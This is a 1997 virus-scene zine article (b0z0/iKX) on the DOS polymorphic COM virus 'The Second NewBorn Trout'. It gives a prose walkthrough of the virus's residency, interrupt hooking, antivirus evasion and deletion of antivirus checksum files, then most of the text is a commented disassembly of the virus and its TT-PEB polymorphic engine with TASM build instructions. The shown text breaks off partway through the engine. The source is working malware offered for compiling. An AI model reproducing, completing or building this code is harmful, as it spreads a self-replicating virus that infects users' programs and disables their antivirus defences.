                     Virus spotlite:  The Second NewBorn Trout
                             by b0z0/iKX, Padania 1997


Virus Name      : The Second NewBorn Trout
Author          : The Tricky Trout
Origin          : Milan (North Italy), 1995
AV Name         : Trout-6804 (AVAST!), Trout2.6804 (AVP), Trout.6804 (DrWeb)
Type            : Direct action/TSR, Poly, COM infector, Retro
Lenght          : 6804 on disk (19967 in memory)

Introduction:
ÄÄÄÄÄÄÄÄÄÄÄÄÄ
 This is a quite old, but interesting virus from North Italy. Its main point
of interest is undoubtely the good polymorphic engine that can generate a lot
of different types of garbage instructions, including fake interrupt calls
and quite long and complex decryptors, ranging at about 1kb-2kb. This should
sound sorta normal nowadays, but for the past days in 1995 it was a great
engine, maybe one of the best around as some AVers stated at the time.

Virus description:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 As it is quite usual the virus will shrink the last MCB and place itself
there. Of course it will then hook interrupt 21h, but instead of pointing
from the IVT directly to the virus handler it will put in the IVT the adress
to the first byte in the new virus segment in high memory. Here (while on
the disk there are some garbage instructions, this is the 5 NOPs at the 1st
gen) the virus will put a jump to the real virus interrupt 21h handler plus
a word as marker. This is done to make the unhooking from the interrupt
21h chain easier. Infact when the virus notices some dangerous program is
going to be started it will encrypt itself in memory and unhook from the
interrupt chain. But more about this stealth feature later.
 Just after going resident TSNBT will turn into a direct action infector to
be sure that the system will became infected. It will infact search for and
infect 5 files in each of the search paths, starting from current directory
on drive C:, then pointing directly to the file C:\DOS\KEYB.COM (quite usual
on every DOS-like system. Of course this search won't be done 5 times ;) ),
then scanning in the C:\DOS directory and finally scanning for COMs in the
current directory. In this way the virus is quite sure that it has been
sucesfully installed on the new system :-)
 At this point, when the installation in memory and on the disk are completed,
the virus will return the control to the original host. After restoring the
host data TSNBT will create a small routine on the stack and will pass the
control to her. This routine will delete the virus from the memory after
the host with zeros and then will pass the control to the host. In this
way the virus isn't present anymore after the host in memory, sorta stealth :)
 While in memory the virus will check for quite a few int 21h functions.
Infact on every execute (4b00h and 4b01h), open (3dh), extended open (6c00h),
rename (56h) and filename parse to fcb (29h) it will check if the file can
be infected (by comparing to the AV, system files and such like strings) and
then will try to infect it. The infection stage is quite an usual COM infection
stage, so nothing special to write :) When a file is executed before the
infection an additional check is done. The virus will check if the program
that is going to be run is an antivirus or a debugger. If so the virus,
apart from not infecting the file, will encrypt itself in memory, unhook
from the interrupt 21h chain (simply putting a jmp far to the old handler
in the 5 bytes we talked about above), setup the stack so the return adress
after the execution will point to the newly generated decryption code and setup
a small routine on the stack that will delete the unencrypted copy of the virus
and then pass the control to the next handler in the interrupt 21h chain. Then
the virus will jump on the routine on the stack that, as said, will overwrite
the unencrypted virus body, leaving of course the encrypted copy that will
be stored higher in the memory block, and then execute the interrupt 21h
funcion requested by the user (4b00h or 4b01h). In this way the antivirus
or debugger that has been executed won't find the virus in the interrupt 21h
chain and won't even be able to scan the memory for a simple scan string!
Infact what is cool is that the virus isn't just encrypted with a standard
loop but the poly engine TT-PEB that is used for the files is used for
memory too, with some additional parameters of course. So detection in memory
is quite hard, at least as hard as on disk. When the antivirus or debugger
will finish it's work DOS will pass control to the CS:IP the virus pushed
previsiously on the stack that points on the decryptor of the virus in
memory. So the virus will decrypt and reinstall itself again in memory.
 Finally at every sucessfull infection the virus will delete some well
known CRC files of the most common antiviruses.

Poly engine description:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 As already said the poly engine, the "Tricky Trout Plurimorphic Encryptor
Builder" (shortly TT-PEB) is very interesting. The version used here is the
2.01, but I don't know of other versions before this one. The TT-PEB is
highly based on the use of tables. Infact for a lot of tasks, in the
generation of the main decryption loop instructions, the TT-PEB selects the
routine to be executed from a table containing adresses. The heart of this
method is the procedure tbl2addr that given the adress of the table and the
number of elements in it will return in AX a randomly choosen adress from the
table. A JMP or a CALL to the AX value will then proceed to the generation of
the selected code. This can be used of course also just to select an element
in AX from the table and use it in another way :-)
 The assignation of the values to the register used as pointer, to the
register used as counter and to the register used to hold the key of the
decryptor is done in a random sequence. The assignation of the value can be
done in three different ways: directly assigning the 16bit value to the
register, by assigning first the low 8bits and later the high 8bits, by
assigning first the high 8bits and then the low 8bits. Of course this is done
when the selected register is suitable for doing that!
 The methods of encryption are the usual ones: XOR, ADD and SUB. Only 8bit
math operation can be done. The operation can be done with an immediate value
or using the key register, but this will have anyway a fixed value in the loop.
 The rest of the loop doens't offer many possible choices. There are three
possible ways of checking if the counter came to zero (check check_counter)
and a standard JZ+JMP construct with garbage in the middle to get back to
the decryption loop.
 The garbage generation is interesting too. The garbage instructions are
generated with something like a garbage compiler based on given garbage
construction commands. The main garbage routine (garb_compiler) will infact
examine byte by byte the pointed garbage construction command. The data in
this construction commands should be interpreted as a command to execute or
just as data to the previous command. It's not so simple to write :-)
Let's see a schematic example:

   garb_cmd        db      X1-A, D1A, X2-B, D2A, D2B, X3-B, D3A, D3B, X4, END

 The Xn should be directives to execute some commands. The -A prefix means
that one parameter is required, -B two parameters, no prefix no parameters.
The Dnk are just data bytes that are required by the command before them.

 The garbage compiler will start reading from the first byte and execute
the command X1-A (the adress in memory of the command is, again, calculated
with a table). This will do something using the data D1A too (for example the
X1-A should just store the D1A byte to the buffer where the decryptor is
going to be done or store the D1A plus and additional word or something else).
The X1-A will also update the pointer to the next instruction to be
interpreted, this is X2-B. So then the X2-B, that will use two data bytes,
will be executed, then the X3 that agains need two params and finally execute
X4 that doesn't need extra data.
 In the TT-PEB itself the commands are represented by the garb_rrXX routines
(XX from 00 to 32). The table that converts a command byte to the adress of
the routine is the garb_routines table. Some commands are also called by
other commands, not just directly from the garbage compiler. As you can see
from the source (sorry, i'm not so lazy to comment one by one :) ) the
garb_rrXX rotuines do various things, from just copying the data byte
given on the given data byte (garb_rr00), or testing if a register (given
as data byte) is already used for the main decryption loop (garb_rr2e), or
testing if we are already in the decryptor loop (garb_rr32), or copy the given
amount of data bytes to the decryptor space (garb_rr01, this takes the first
data byte as the number of bytes to copy and the next bytes as data to be
copyed) and so on.
 A command value of 0ffh means that the command has finished or it has to
be stopped (for example if a test for a register has been negative).
In my opinion this kind of garbage generator is very cool, extremely
elegant and easy to extend. The only bad thing i can see is the space used:
infact it should need too much space for some kind of construct, for example
for the generation of one byte garbagers.
 The TT-PEB can generate a good variety of garbage instructions: math
operations with registers and memory, operations with registers, comparations
and the usual stuff. It is interesting that the poly also generates code to
use (in math operations) or compare memory using registers as pointers and
not just only immediate adresses (ex. mov ch,byte ptr ds:[bx+di] and such).
There are also a few fake interrupt calls to both int 13h and 21h. A few
more simple call and jump instructions are also included (see garb_cf0 to
garb_cf5 in source, they are fully described there).
 Another interesting thing is that after the decryptor will be generated the
poly will execute it from memory to encrypt the body of the virus. Of course
the TT-PEB will put a RET instruction just after the end of the decryptor
(encryptor) so it will be able to get control again. When the decryptor will
finish to encrypt the body the TT-PEB will finally delete the RET used just
in memory, will change the math operation that encrypted the body to its
complementary for the decryption and will finally put the real value to the
assignation of the pointer (since before it just put the assignation valid
for execution in memory).

The disasm:
ÄÄÄÄÄÄÄÄÄÄÄ
 Here you have the entire disasm of the virus and of the TT-PEB. Some parts
like the garbage generation routines aren't fully commented since they are
quite simple to understand for the average poly coder. Also I left out many
labels and a few comments from the first hand Sourcer pass. I am not so lazy
to change every label just to hide the first pass :)
 Here comes the source! To get the original compile using TASM 3.0:

TASM /m5 2trout.asm
TLINK /t 2trout.obj

Enjoy!


;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ					                                 ÛÛ
;ÛÛ                       The Second NewBorn Trout                       ÛÛ
;ÛÛ                      Written by The Tricky Trout                     ÛÛ
;ÛÛ                        Milan, North Italy 1995                       ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                          Disasm by b0z0/iKX                          ÛÛ
;ÛÛ                             Padania 1997                             ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

virus_length    equ     (offset tsnbt_fend - offset tsnbt_start)
virus_mem       equ     (offset mem_end - offset tsnbt_start)

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a

		org	100h

tsnbt_start:
		nop
		nop
		nop
		nop
		nop
tt_real_virus:
                sti
                cld                             

                pushf
		push	ax
                call    delta_offset

delta_offset:
                mov     si,01
                cli
		xchg	si,sp
                lodsw                           ; call adress in AX
		xchg	sp,si
                sti

                sub     ax,offset delta_offset  ; calculate delta offset
                mov     bp,ax                   ; delta offset in BP

                cmp     byte ptr cs:[poly_in_mem + bp],0
                mov     byte ptr cs:[poly_in_mem + bp],0
                jnz     run_from_mem

                pop     ax
                popf

                call    restore_victim          ; restore victim data
                call    res_check
                jz      already_resident

                call    mem_signature
                call    go_resident
                call    infect_sys

already_resident:
; here the virus creates a bounch of bytes of code on the stack that will
; overwrite the virus in memory (the one after the infected file, of course
; not the one resident in mem :) ) with zeros and then return the control
; to the host (this is CS:100h)

                sub     bx,bx
                mov     cx,0ffh
		mov	dx,cs
		mov	si,100h
                mov     di,0fffeh

                mov     ax,00h
                push    ax                      ; push 00

                mov     ax,08cah                ; push 0ca08 ('retf 8' with
                push    ax                      ; the previous zeros)

                mov     ax,595fh                ; push 5f59h ('pop di',
                push    ax                      ; 'pop cx')

                mov     ax,0aaf3h               ; push f3aah ('rep stosb')
		push	ax

                cli
                mov     word ptr ds:[jump_sp + bp],sp
                mov     word ptr ds:[jump_ss + bp],ss
                sti                             ; store SS:SP for our jump
                                                ; on the stack

                push    cs                      ; this will be the return
                push    si                      ; adress

		push	di
		push	cx

                lea     di,cs:[105h + bp]       ; point on virus body
                mov     cx,virus_length         ; the rep stosb will delete
                sub     ax,ax                   ; the virus in memory with
                sub     bp,bp                   ; zeros (in mem after the COM)


                db      0eah                    ; jmp far on our code on the
jump_sp         dw      00h                     ; stack
jump_ss         dw      00h

run_from_mem:
; if the virus is encrypted in memory after the decryptor it will rehook the
; int 21h and copy just it's decrypted body where on its place

		mov	ax,cs
		mov	ds,ax
                mov     es,word ptr ds:[poly_segmem + bp]
                lea     si,ss:[int21h_jump + bp]
                mov     di,100h                 ; put again the virus int 21h
                mov     cx,5                    ; handler in the chain
                rep     movsb

                lea     si,ss:[105h + bp]
                mov     cx,virus_length         ; reput virus to it's place
                rep     movsb                   ; in memory

                pop     ax                      ; pop exec return stuff
                popf

                pop     bp                      ; correct stack from the
                pop     es                      ; work before
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
                retf    2                       ; go on :)

restore_victim:
                lea     si,ss:[orig_bytes + bp] ; point on victim saved data
                mov     di,100h
		mov	cx,5
                rep     movsb                   ; restore the 5 bytes
		retn

res_check:
                mov     ax,6353h                ; residency check call
		mov	cl,0
                int     21h
                cmp     ax,3254h                ; set flags and set ds=cs
		mov	ax,cs
		mov	ds,ax
		retn

mem_signature:
		push	ds
		sub	ax,ax
                mov     ds,ax                   ; set a virus marker in memory
                mov     word ptr ds:[20ch],'XV'
		pop	ds
		retn

go_resident:
		push	ds
		push	es
		mov	ax,cs
		sub	ax,1
                mov     ds,ax                   ; on mcb

                cmp     byte ptr ds:[0],'Z'     ; last mcb?
                je      is_our_last
                jmp     short bad_memory
is_our_last:
                mov     ax,virus_mem            ; needed memory
		mov	cl,4
                shr     ax,cl                   ; convert to paras
                add     ax,1

                mov     dx,word ptr ds:[3]
		sub	dx,ax
                mov     word ptr ds:[3],dx      ; shrink for virus

                sub     bx,bx
		mov	es,bx

                shr     ax,cl
                shr     cl,1
                shr     ax,cl                   ; convert to kbs
		add	ax,1

                sub     word ptr es:[413h],ax   ; lower system memory

                mov     ax,cs
		add	dx,ax
                sub     dx,10h                  ; calculate virus segment
		mov	es,dx

                cli
		sub	ax,ax
		mov	ds,ax

                mov     ax,100h                 ; BX:AX point to the jump
                mov     bx,es                   ; to the int 21h handler

                xchg    ds:[21h * 4],ax         ; hook int21h
                xchg    ds:[21h * 4 + 2],bx

                mov     cs:[orig_int21h + bp],ax
                mov     word ptr cs:[orig_int21h+2 + bp],bx

                mov     word ptr cs:[int24_off + bp],offset int24h_handler
                mov     word ptr cs:[int24_seg + bp],es
                                                ; initialize int24h adress
                mov     ax,cs
		mov	ds,ax

                lea     si,ss:[int21h_jump + bp]
                mov     di,100h
                mov     cx,5                    ; copy the jump to int 21h
                rep     movsb                   ; handler

                lea     si,ss:[105h + bp]
                mov     cx,virus_length         ; copy virus to memory
                rep     movsb
                sti

bad_memory:
		pop	es
		pop	ds
		retn

infect_sys:
; when the virus goes resident it will search for some files to infect that
; are usually on every system (look at the string later in the source). this
; of course is a good idea to implant the virus in the system.

		push	ds
                mov     ah,2Fh                  ; get dta
                int     21h

                push    bx
		push	es
                mov     ah,1Ah                          ; set dta
                lea     dx,ss:[offset mem_buff + bp]    ; dta to our free mem
                int     21h

                lea     dx,cs:[fastfile1 + bp]          ; fastly infect some
                call    fast_infect                     ; files on the system
                lea     dx,cs:[fastfile2 + bp]
                call    fast_infect
                lea     dx,cs:[fastfile3 + bp]
                call    fast_infect
                lea     dx,cs:[fastfile4 + bp]
                call    fast_infect

                pop     ds
		pop	dx
                mov     ah,1ah                  ; set original dta
                int     21h

                pop     ds
		retn

fast_infect:
                mov     byte ptr ds:[fast_cntr + bp],0  ; initialize counter
                mov     ah,4Eh                  ; findfirst
		mov	cx,3
do_find_fn:
                int     21h
                jc      end_fast_inf            ; carry = finished

                mov     si,dx
                lea     di,ss:[buff_2 + bp]
loc_11:
		mov	al,[si]
                cmp     al,'*'                  ; wildcard search?
                je      loc_12
		mov	[di],al
                cmp     al,0                    ; end of name
                je      loc_14
		add	si,1
		add	di,1
		jmp	short loc_11
loc_12:
                lea     si,ss:[buff_1 + bp]
loc_13:
		mov	al,[si]
		mov	[di],al
		add	si,1
		add	di,1
		cmp	al,0
                jne     loc_13
loc_14:
		push	dx

                mov     ax,6353h                ; virus internal function
                mov     cl,1                    ; to infect a file
                lea     dx,cs:[1BC9h + bp]
                int     21h                     

                pop     dx
		mov	ax,cs
		mov	ds,ax
                jc      loc_15                  ; carry no infection, so
                                                ; don't update counter

                add     byte ptr ds:[fast_cntr + bp],1
                cmp     byte ptr ds:[fast_cntr + bp],5
                je      end_fast_inf            ; already 5 infected files?
loc_15:
                mov     ah,4fh                  ; set AH for findnext call
                jmp     short do_find_fn
end_fast_inf:
		retn

int21h_handler:
; Interrupt 21h handler
                cmp     ax,4b00h                ; execute
                je      exec_on21

                cmp     ax,4b01h                ; execute
                je      exec_on21

                cmp     ah,3dh                  ; open
                je      open_on21

                cmp     ax,6c00h                ; extended open
                je      eope_on21

                cmp     ah,56h                  ; rename
                je      open_on21

                cmp     ah,29h                  ; parse filename into fcb
                je      eope_on21

                cmp     ax,6353h                ; residency and internal
                je      resi_on21               ; virus stuff

chain_on21:
                jmp     dword ptr cs:[orig_int21h]
exec_on21:
                call    filenmav_chk
                jnc     no_av1
                jmp     av_executed
no_av1:
                call    filename_chk
                jc      bad_name1
                call    infect_file
bad_name1:
                jmp     short chain_on21

open_on21:
                call    filename_chk
                jc      bad_name2
                call    infect_file
bad_name2:
                jmp     short chain_on21

eope_on21:
		push	dx
		mov	dx,si
                call    filename_chk
                jc      bad_name3
                call    infect_file
bad_name3:
		pop	dx
                jmp     short chain_on21

resi_on21:
		cmp	cl,0
                je      just_residency_check

                cmp     cl,1
                je      infect_it
                iret

just_residency_check:
		mov	ax,3254h
		iret				; Interrupt return
infect_it:
                call    filename_chk
                jc      loc_ret_28

                mov     byte ptr cs:[good_inf],0
                call    infect_file
                cmp     byte ptr cs:[good_inf],1

loc_ret_28:
                retf    2

filename_chk:
                ; ok exit without carry, bad exit with carry. Bad exit if:
                ;  1) the extension isn't COM
                ;  2) the file is an OS file
                ;  3) file is an AV

                call    push_all
		mov	si,dx
nnn_loop:
                cmp     byte ptr [si],0         ; end of the string?
                je      end_string

                cmp     byte ptr [si],'.'
                je      got_dotext

                add     si,1
                jmp     short nnn_loop
got_dotext:
		add	si,1
		push	dx
		mov	dx,si

                mov     di,offset com_suffix
                call    cmpre_names             ; check if the extension
                                                ; is COM

                pop     dx
                jc      ok_extcom               ; extension is ok
end_string:
                stc
                jmp     short exit_cmp1
ok_extcom:
                mov     di,offset os_files      ; check if os file
                call    cmpre_names
                jc      exit_cmp1               ; carry = sysfile, leave it

                mov     di,offset av_names      ; check if av
                call    cmpre_names
exit_cmp1:
                call    pop_all
		retn

filenmav_chk:
; check if the filename is an antivirus. carry if it is

                call    push_all
                mov     di,offset av_names
                call    cmpre_names
                call    pop_all
		retn

cmpre_names:
; DS:DX         = pointer on path to file to check
; CS:DI         = pointer on string (or strings) to compare the filename to

                mov     si,dx
loop_change:
                mov     bx,si                   ; pointer on filename in BX
path_loop:
                cmp     byte ptr [si],0         ; end of filename
                je      end_path_loop

                cmp     byte ptr [si],'\'
                je      delimitator

                cmp     byte ptr [si],':'
                je      delimitator

                add     si,1
                jmp     short path_loop
delimitator:
                add     si,1
                jmp     short loop_change       ; set filename starting
                                                ; point
end_path_loop:
		mov	cl,0
                mov     si,bx                   ; SI pointer on filename

                cmp     byte ptr cs:[di],0      ; end of string?
                jne     check_string

                clc                             ; no carry, name is ok
		retn
check_string:
                mov     al,byte ptr ds:[si]     ; AL = filename char
                mov     ah,byte ptr cs:[di]     ; AH = compared char
                or      al,20h                  ; convert to lowercase
                or      ah,20h

                cmp     al,ah
                je      char_match
                mov     cl,1                    ; cl=1, name differs
char_match:
                add     si,1                    ; both to next char
		add	di,1

                cmp     ah,'.'                  ; end of name to check?
                je      founded_dot

                cmp     ah,20h
                jne     check_string
founded_dot:
                cmp     cl,1                    ; if cl=1 at least one
                                                ; char differs
                je      end_path_loop

                stc                             ; carry, ok name
		retn

loc_41:
		jmp	loc_45
		jmp	loc_43
loc_42:
		jmp	loc_44

infect_file:
                mov     word ptr cs:[finf_name],dx
                mov     word ptr cs:[finf_name+2],ds

                call    push_all
                call    handler_24

                call    get_attrib
                jc      loc_41

                mov     word ptr ds:[orig_att],cx       ; save attribs

                call    open_ro
                jc      loc_41

                call    get_time
                mov     word ptr ds:[f_time],cx ; save file time and date
                mov     word ptr ds:[f_date],dx

                mov     cx,5
                mov     dx,offset orig_bytes    ; read 5 bytes from head
                call    read_file

                cmp     ax,cx                   ; check if readed 5 bytes
                jne     loc_42

                cmp     word ptr ds:[orig_bytes],'ZM'   ; exe?
                je      loc_42

                cmp     word ptr ds:[orig_bytes],'MZ'   ; exe?
                je      loc_42

                cmp     word ptr ds:[orig_bytes+3],'T2' ; already infected?
                je      loc_42

                call    lseek_fend              ; get file lenght
		cmp	dx,0
                jne     loc_42

                cmp     ax,0e000h
		jae	loc_42			; Jump if above or =

                cmp     ax,5
		jb	loc_42			; Jump if below

                mov     ds:[f_length],ax
                call    close_file

                sub     cx,cx
                call    set_attrib              ; delete attributes
                jc      loc_41

                call    open_rw                 ; open in RW mode now
                jc      loc_41

                call    lseek_fend

                mov     byte ptr [good_inf],1
		push	ds
		push	es
		mov	ax,cs
                mov     dx,offset mem_buff              ; mem for poly use
		mov	cl,4
                shr     dx,cl
		add	dx,1
		add	ax,dx
		mov	es,ax

                mov     dx,offset tt_real_virus         ; set poly params
                mov     cx,virus_length
                mov     bp,word ptr ds:[f_length]
		add	bp,100h
		sub	si,si
		mov	ax,6
                call    ttpeb                           ; call poly engine

                call    write_file
		pop	es
		pop	ds

                call    lseek_fsta
                mov     ax,ds:[f_length]

                sub     ax,3
                mov     byte ptr [orig_bytes],0e9h      ; jump to virus
                mov     word ptr [orig_bytes+1],ax
                mov     word ptr ds:[orig_bytes+3],'T2' ; marker

                mov     cx,5
                mov     dx,offset orig_bytes            ; write new head
                call    write_file

                mov     cx,word ptr ds:[f_time]
                mov     dx,ds:[f_date]
                call    set_time                        ; set orig time

                call    close_file                      ; close file

                mov     cx,word ptr ds:[orig_att]
                call    set_attrib                      ; set orig attribs

                call    delete_crcs
		jmp	short loc_45
loc_43:
                call    close_file
                mov     cx,word ptr ds:[orig_att]
                call    set_attrib
		jmp	short loc_45
loc_44:
                call    close_file
		jmp	short loc_45
loc_45:
                call    handler_24
                call    pop_all
		retn

get_attrib:
		mov	al,0
                jmp     short do_attrib
set_attrib:
		mov	al,1
                jmp     short do_attrib
do_attrib:
                lds     dx,dword ptr cs:[finf_name]
                mov     ah,43h                          ; chmod
                call    orig_int21
		mov	ax,cs
		mov	ds,ax
		retn

open_ro:
		mov	al,0
                jmp     short do_open
open_rw:
		mov	al,2
                jmp     short do_open
do_open:
                lds     dx,dword ptr cs:[finf_name]
                mov     ah,3Dh                  ; open file
                call    orig_int21
                xchg    bx,ax                   ; handle in bx
		mov	ax,cs
		mov	ds,ax
		retn

get_time:
		mov	al,0
                jmp     short do_time
set_time:
		mov	al,1
                jmp     short do_time
do_time:
                mov     ah,57h                  ; set/get file date/time
                call    orig_int21
		retn

lseek_fsta:
                mov     al,0
                jmp     short lseek
lseek_fend:
                mov     al,2                    ; lseek from end
                jmp     short lseek
lseek:
		sub	cx,cx
		sub	dx,dx
                mov     ah,42h                  ; lseek
                call    orig_int21
		retn

read_file:
                mov     ah,3fh                  ; read from file
                call    orig_int21
		retn

write_file:
                mov     ah,40h                  ; write to file
                call    orig_int21
		retn

close_file:
                mov     ah,3Eh                  ; close file
                call    orig_int21
		retn


delete_crcs:
; deletes checksum files and such things

                mov     dx,offset crc_files
loc_50:
                mov     di,offset mem_buff
                lds     si,dword ptr cs:[finf_name]

                push    si
		mov	si,dx
                cmp     byte ptr cs:[si],'\'
		pop	si
                jnz     loc_52

                cmp     byte ptr [si+1],':'
                jne     loc_51

                mov     ax,word ptr ds:[si]
                mov     word ptr cs:[di],ax
		add	si,2
		add	di,2
loc_51:
		jmp	short loc_56
loc_52:
                mov     al,byte ptr ds:[si]     ; copy file name
                mov     byte ptr cs:[di],al
		add	si,1
		add	di,1
		cmp	al,0
                jne     loc_52

                mov     si,offset mem_buff
loc_53:
		mov	di,si
loc_54:
                cmp     byte ptr cs:[si],':'
                je      loc_55

                cmp     byte ptr cs:[si],'\'
                je      loc_55

                cmp     byte ptr cs:[si],0
                je      loc_56

                add     si,1
		jmp	short loc_54
loc_55:
		add	si,1
		jmp	short loc_53
loc_56:
		mov	si,dx
loc_57:
                mov     al,byte ptr cs:[si]
                mov     byte ptr cs:[di],al
		add	si,1
		add	di,1
		cmp	al,0
                jne     loc_57

                mov     ax,cs
		mov	ds,ax
		push	dx

                mov     ax,4301h                ; delete file attributes
		sub	cx,cx
                mov     dx,offset mem_buff
                call    orig_int21

                mov     ah,41h                  ; delete file
                mov     dx,offset mem_buff
                call    orig_int21

		pop	dx
		mov	si,dx
loc_58:
		cmp	byte ptr [si],0
                je      loc_59
		add	si,1
		jmp	short loc_58
loc_59:
		add	si,1
                cmp     byte ptr [si],0         ; two zeros means end
                je      loc_ret_60
		mov	dx,si
		jmp	loc_50

loc_ret_60:
		retn

handler_24:
                push    ds                      ; install/uninstall virus
                sub     ax,ax                   ; int24h handler
		mov	ds,ax
                mov     ax,cs:[int24_off]
                mov     bx,cs:[int24_seg]

                xchg    ds:[24h * 4],ax
                xchg    ds:[24h * 4 + 2],bx

                mov     cs:[int24_off],ax
                mov     cs:[int24_seg],bx
		pop	ds
		retn

orig_int21:
                pushf                           ; do a call to original 21h
                call    dword ptr cs:[orig_int21h]
		retn


push_all:
                pop     word ptr cs:[return_addr]
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es
		push	bp
                jmp     word ptr cs:[return_addr]

pop_all:
                pop     word ptr cs:[return_addr]
		pop	bp
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
                jmp     word ptr cs:[return_addr]

return_addr     db      0ah,04h                 ; temp stuff

int24h_handler:
                mov     al,3
                iret

av_executed:
; if a known antivirus (from the latter strings) is going to be run the virus
; will reput the old int21h handler in the chain. then the virus will
; encrypt itself (poly encryption using TT-PEB) in memory. using a small
; routine on the stack the virus will then erase its clean copy from the
; memory (leaving just the encrypted one) and jump far to the original
; int 21h routine that will execute the antivirus. at the return from the
; exec routine, cs:ip will be set to the poly decryptor generated in memory
; (since the virus will push on the stack also the cs:ip of that) and so
; the virus will be able again to get power

                pushf
                call    push_all
                mov     byte ptr cs:[poly_in_mem],1
                mov     word ptr cs:[poly_segmem],cs

                mov     byte ptr cs:[100h],0eah

                mov     ax,word ptr cs:[orig_int21h]
                mov     bx,word ptr cs:[orig_int21h+2]

                mov     word ptr cs:[101h],ax           ; restore old int21h
		mov	word ptr cs:[103h],bx

                mov     ax,cs
                mov     dx,offset mem_buff
		mov	cl,4
                shr     dx,cl                           ; mem for poly
		add	ax,dx
		add	ax,1
		mov	es,ax

                mov     ax,cs
		mov	ds,ax
                mov     dx,105h                         ; poly params
                mov     cx,virus_length
		sub	bp,bp
		sub	si,si
		mov	ax,0Fh
                call    ttpeb                           ; call poly

                mov     cs:[encvir_dx],dx               ; save seg:off of the
                mov     cs:[encvir_ds],ds               ; encrypted body in mem
                call    pop_all
                popf

                push    bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es
		push	bp
                pushf

                push    cs:[encvir_ds]          ; where int 21h will return
                push    cs:[encvir_dx]          ; after the execution of the
                                                ; antivirus
                mov     cx,6
		push	cx
                mov     cx,0ca07h               ; push 'retf 6'
                push    cx                      ;  and 'pop es'
                mov     cx,0aaf3h
                push    cx                      ; push 'rep stosb'

                cli
                mov     word ptr cs:[jump_sp2],sp
                mov     word ptr cs:[jump_ss2],ss
                sti

                push    word ptr cs:[orig_int21h+2]     ; where will the
                push    word ptr cs:[orig_int21h]       ; ret jump
		push	es
		mov	cx,cs
		mov	es,cx
                mov     di,105h                 ; point on virus body in high
                mov     cx,virus_length         ; memory

                db      0eah                    ; jmp far to the created
jump_sp2        dw      00h                     ; routine on the stack that
jump_ss2        dw      00h                     ; will delete the clear body
                                                ; from memory and then execute
                                                ; the int 21h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;       TT-PEB (Tricky Trout Plurimorphic Encryptor Builder) v 2.01
;
;
; Entry parameters:
;       AX     = The low 4 bits are used as parameters to the poly:
;                       1 bit:  1 force CS on decrypt operation (0 no CS:)
;                               [0 for files, 1 when body run in mem]
;                       2 bit:  1 create garbage (0 no garbage)
;                       3 bit:  1 create more garbage (0 less garbage)
;                       4 bit:  1 create code to save (and restore at end)
;                               the AX register and the flags (this is do
;                               a push ax and pushf)
;                               [1 needed when body run in mem, since it is
;                               needed to preserve the return stuff]
;       BP     = Offset at which the code will run
;       CX     = Length of code to be encrypted
;       DS:DX  = Pointer on code to be encrypted
;       ES:SI  = Pointer on temp space for poly use
;
; On exit:
;       AX     = CX on entry
;       CX     = Length of generated code
;       DS:DX  = Pointer on generated code
;
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

poly_marker     db      '[TT-PEB]'

ttpeb:
                cli                                     ; store SS and SP
                mov     word ptr cs:[tt_saved_sp],sp
                mov     word ptr cs:[tt_saved_ss],ss
                mov     sp,cs                           ; set stack to our
                mov     ss,sp                           ; memory
                mov     sp,offset tt_stack
                sti

                push    bx
		push	si
                push    bp                              ; save some parameters
                mov     word ptr cs:[tt_saved_dx],dx
                mov     word ptr cs:[tt_saved_ds],ds
                mov     word ptr cs:[tt_saved_cx],cx
                mov     word ptr cs:[tt_saved_bp],bp
                mov     word ptr cs:[tt_saved_si],si
                mov     word ptr cs:[tt_saved_ax],ax

                mov     ax,cs
		mov	ds,ax
poly_init:
                mov     byte ptr [pntr_reg],0ffh        ; initialize all
                mov     byte ptr [cntr_reg],0ffh        ; poly variables and
                mov     byte ptr [oper_reg],0ffh        ; such
                mov     byte ptr [pntr_chdone],0ffh
                mov     byte ptr [cntr_chdone],0ffh
                mov     word ptr [rnd_pos],0ffffh
                mov     byte ptr [spec_cnst],0ffh
                mov     byte ptr [some_lock],0ffh
                mov     byte ptr [decr_init],0ffh

; here the TT-PEB will create a table with offsets to garbage constructs
; (offsets are from the garbage_offsets table) to be used in garbage
; generation in the entire poly process

                mov     si,offset garbage_offsets
		mov	di,2
do_mem_tbl:
                call    get_random              ; how many times will this
                and     al,3                    ; adress figure out?
                cbw

                mov     cx,ax
                mov     ax,word ptr [si]        ; get adress

                cmp     ax,0                    ; AX=00 if garbage_offsets
                je      mem_tbl_end             ; table ended

                cmp     cx,0
                je      cx_zero
                rep     stosw
cx_zero:
                add     si,2                    ; go to next entry in g_off
                jmp     short do_mem_tbl        ; table
mem_tbl_end:
		sub	di,2
                shr     di,1

                mov     es:[0],di               ; nr of garbage adresses
		mov	ax,es
		add	ax,40h
                mov     es,ax                   ; where the decryptor
                sub     di,di                   ; will be created

                mov     ax,[tt_saved_ax]
                and     ax,8                    ; need to preserve AX and F?
		cmp	ax,0
                je      no_saveaxf

                call    get_random
